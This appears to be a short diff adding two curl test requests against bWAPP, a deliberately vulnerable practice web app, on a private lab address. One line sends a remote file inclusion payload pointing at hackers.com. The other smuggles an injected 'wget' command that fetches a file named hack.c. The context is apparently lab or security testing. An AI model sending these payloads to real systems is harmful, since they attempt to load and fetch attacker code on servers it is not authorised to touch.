@@ -1,0 +1,2 @@
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?file=http://www.hackers.com/txt?"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?file=test;wget+127.0.0.1/hack.c"
